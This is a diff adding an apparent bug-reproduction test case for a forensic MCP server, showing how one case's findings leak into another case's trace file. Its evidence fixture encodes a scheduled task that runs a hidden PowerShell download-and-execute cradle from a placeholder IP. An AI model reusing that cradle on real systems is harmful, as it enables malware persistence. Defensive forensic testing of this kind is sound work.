@@ -1,0 +1,110 @@
+# Matrix case P3187-019: opening an existing trace path with another case_id
+# starts an empty trace in memory (configure warns "existing trace has
+# case_id=..., overwriting"), and start_execution_log answers
+# entries_recovered 0. But the next _flush reads the file on disk, takes every
+# entry whose call_id it does not hold as a hook entry and merges them into
+# the new case's file, and transaction() (used by reason_readiness_status and
+# record_finding) pulls them back into memory, so the earlier case's finding
+# is read as the new case's own.
+# The earlier case (CASE-2026-0412) is resumed from a trace whose previous
+# dair_assess moved it into Collect (the bench has no DAIR backend key;
+# record_finding needs a recent dair_call); its finding is recorded in this
+# PoC by the server itself.
+case_id: P3187-019
+problem: P3187
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "같은 사건 폴더에서 조사를 새 사건 번호로 다시 시작하면서 trace 경로는 앞서 쓰던 analysis/ 경로를 그대로 주는 것은 모델이나 분석가의 실수로 일어날 수 있고, 서버는 경고만 하고 받아 준다."
+coverage: full
+summary: 'After case CASE-2026-0412 records a finding in analysis/WKSTN-07_trace.json, misc_start_execution_log for case CASE-2026-0413 on the same path answers entries_recovered 0, yet reason_readiness_status for the new case counts 8 trace entries (3 of its own) and rates Persistence suspected from the earlier case''s finding, and the new case''s trace file holds that finding.'
+summary_ko: "사건 CASE-2026-0412가 analysis/WKSTN-07_trace.json에 발견을 기록한 뒤, 같은 경로로 사건 CASE-2026-0413의 `misc_start_execution_log`를 부르면 `entries_recovered` 0이 나오는데, 새 사건의 `reason_readiness_status`는 trace 항목을 8개(새 사건 몫은 3개)로 세고 앞 사건의 발견을 근거로 Persistence 단계를 suspected로 보며, 새 사건의 trace 파일에도 그 발견이 들어 있다."
+defect_ko: "이 서버는 다른 사건이 쓴 trace 위에 새 사건을 열면 빈 기록으로 시작한다고 답하면서, 다음 쓰기 때 디스크에 있던 앞 사건 항목을 모두 새 사건 파일에 합치고 다시 메모리로 읽어 들인다. 정상이라면 다른 사건의 trace를 거부하거나 앞 내용을 따로 보존하고 섞지 않아야 한다. 모델은 앞 사건의 발견을 지금 사건에서 찾은 발견으로 잘못 알고, 보고서 준비 상태도 그 발견을 넣어 판단한다."
+setup_ko: "예약 작업 파일(OneDriveUpdater, 로그온 때 숨긴 PowerShell로 203.0.113.7에서 내려받음)을 증거로 두고, 이전 세션에서 Collect 단계로 넘어간 사건 CASE-2026-0412의 trace를 이어서 연 뒤 그 사건의 발견을 기록한다."
+env:
+  TRUDI_MITRE_TABLE: /opt/trudi/cases/.common/mitre_techniques.json
+fixture:
+  - path: analysis/WKSTN-07_trace.json
+    root: db
+    text: |
+      {
+        "case_id": "CASE-2026-0412",
+        "entries": [
+          {
+            "call_id": 1,
+            "type": "dair_call",
+            "ts": "2026-11-27T09:12:40Z",
+            "current_phase": "Triage",
+            "phase_rationale": "Initial alert triaged; scope the host artifacts next.",
+            "transition_recommended": true,
+            "next_phase": "Collect",
+            "transition_rationale": "Triage complete; collect registry and event logs.",
+            "stack_action": "push",
+            "investigation_focus": "Collect registry hives and event logs from WKSTN-07.",
+            "verification_satisfied": true,
+            "verification_challenges": [],
+            "recommended_actions": [],
+            "directives": {"priority_tools": [], "skip_tools": [], "focus_pids": [], "focus_paths": []},
+            "input_tokens": 3120,
+            "output_tokens": 410,
+            "phase": "Collect"
+          }
+        ]
+      }
+  # Task Scheduler XML as Windows writes it (UTF-16LE with BOM, CRLF): logon
+  # trigger, hidden PowerShell download cradle from 203.0.113.7.
+  - path: C/Windows/System32/Tasks/OneDriveUpdater
+    base64: //48AD8AeABtAGwAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMAAiACAAZQBuAGMAbwBkAGkAbgBnAD0AIgBVAFQARgAtADEANgAiAD8APgANAAoAPABUAGEAcwBrACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADIAIgAgAHgAbQBsAG4AcwA9ACIAaAB0AHQAcAA6AC8ALwBzAGMAaABlAG0AYQBzAC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvAHcAaQBuAGQAbwB3AHMALwAyADAAMAA0AC8AMAAyAC8AbQBpAHQALwB0AGEAcwBrACIAPgANAAoAIAAgADwAUgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4ASQBuAGYAbwA+AA0ACgAgACAAIAAgADwARABhAHQAZQA+ADIAMAAyADQALQAxADAALQAyADcAVAAwADMAOgA0ADEAOgAxADIAPAAvAEQAYQB0AGUAPgANAAoAIAAgACAAIAA8AEEAdQB0AGgAbwByAD4AVwBLAFMAVABOAC0AMAA3AFwAagBkAG8AZQA8AC8AQQB1AHQAaABvAHIAPgANAAoAIAAgACAAIAA8AFUAUgBJAD4AXABPAG4AZQBEAHIAaQB2AGUAVQBwAGQAYQB0AGUAcgA8AC8AVQBSAEkAPgANAAoAIAAgADwALwBSAGUAZwBpAHMAdAByAGEAdABpAG8AbgBJAG4AZgBvAD4ADQAKACAAIAA8AFQAcgBpAGcAZwBlAHIAcwA+AA0ACgAgACAAIAAgADwATABvAGcAbwBuAFQAcgBpAGcAZwBlAHIAPgANAAoAIAAgACAAIAAgACAAPABFAG4AYQBiAGwAZQBkAD4AdAByAHUAZQA8AC8ARQBuAGEAYgBsAGUAZAA+AA0ACgAgACAAIAAgADwALwBMAG8AZwBvAG4AVAByAGkAZwBnAGUAcgA+AA0ACgAgACAAPAAvAFQAcgBpAGcAZwBlAHIAcwA+AA0ACgAgACAAPABBAGMAdABpAG8AbgBzACAAQwBvAG4AdABlAHgAdAA9ACIAQQB1AHQAaABvAHIAIgA+AA0ACgAgACAAIAAgADwARQB4AGUAYwA+AA0ACgAgACAAIAAgACAAIAA8AEMAbwBtAG0AYQBuAGQAPgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQA8AC8AQwBvAG0AbQBhAG4AZAA+AA0ACgAgACAAIAAgACAAIAA8AEEAcgBnAHUAbQBlAG4AdABzAD4ALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADcALwBhAC4AcABzADEAJwApACIAPAAvAEEAcgBnAHUAbQBlAG4AdABzAD4ADQAKACAAIAAgACAAPAAvAEUAeABlAGMAPgANAAoAIAAgADwALwBBAGMAdABpAG8AbgBzAD4ADQAKADwALwBUAGEAcwBrAD4ADQAKAA==
+steps:
+  - tool: misc_start_execution_log
+    note_ko: "준비: 이전 세션의 사건 CASE-2026-0412 기록(Collect 단계)을 이어서 연다"
+    args:
+      case_id: CASE-2026-0412
+      output_path: ${DB_DIR}/analysis/WKSTN-07_trace.json
+      case_dir: ${DB_DIR}
+      launch_dashboard: false
+  - tool: strings_grep
+    note_ko: "준비: 예약 작업 파일(UTF-16)에서 다운로드 명령을 찾는다(근거 호출, call_id 4)"
+    args:
+      file_path: ${EVIDENCE}/C/Windows/System32/Tasks/OneDriveUpdater
+      pattern: DownloadString
+      encoding: utf16le
+  - tool: misc_record_finding
+    note_ko: "준비: 사건 CASE-2026-0412의 발견을 기록한다"
+    args:
+      description: Scheduled task OneDriveUpdater runs hidden PowerShell at logon and downloads http://203.0.113.7/a.ps1.
+      confidence: SUSPECTED
+      source: strings.grep
+      linked_call_id: 4
+      techniques: [T1053.005]
+      claim_kind: positive
+      category: persistence
+      act: persistence_install
+  - tool: misc_start_execution_log
+    note_ko: "결함 호출: 같은 trace 경로로 새 사건 CASE-2026-0413을 연다"
+    args:
+      case_id: CASE-2026-0413
+      output_path: ${DB_DIR}/analysis/WKSTN-07_trace.json
+      case_dir: ${DB_DIR}
+      launch_dashboard: false
+  - tool: reason_readiness_status
+    note_ko: "비교 호출: 새 사건의 보고서 준비 상태를 본다"
+expect:
+  - step: 3
+    note_ko: "앞 사건의 발견이 기록됐다"
+    regex: '"success": true, "description": "Scheduled task OneDriveUpdater[^"]*", "confidence": "SUSPECTED"'
+  - step: 4
+    note_ko: "새 사건으로 열면 되살린 항목이 0이라고 답한다"
+    regex: '"case_id": "CASE-2026-0413", [^{}]*"entries_recovered": 0, "resumed": false'
+  - step: 5
+    note_ko: "그런데 새 사건의 준비 상태는 앞 사건의 SUSPECTED 발견 때문에 Persistence 단계를 suspected로 본다"
+    regex: '"persistence": \{"label": "Persistence", "status": "suspected", "sources_examined": \["scheduled_tasks"\]'
+  - step: 5
+    note_ko: "새 사건이 만든 항목은 3개인데 준비 상태는 trace 항목을 8개로 센다(앞 사건의 5개가 섞였다)"
+    contains: '"trace_entries": 8,'
+  - file_regex: ${DB_DIR}/analysis/WKSTN-07_trace.json
+    note_ko: "새 사건의 trace 파일에 앞 사건의 발견이 들어 있다"
+    pattern: '^\{\s*"schema_version": "2\.0",\s*"case_id": "CASE-2026-0413"[\s\S]*"type": "finding"[\s\S]*Scheduled task OneDriveUpdater runs hidden PowerShell at logon'
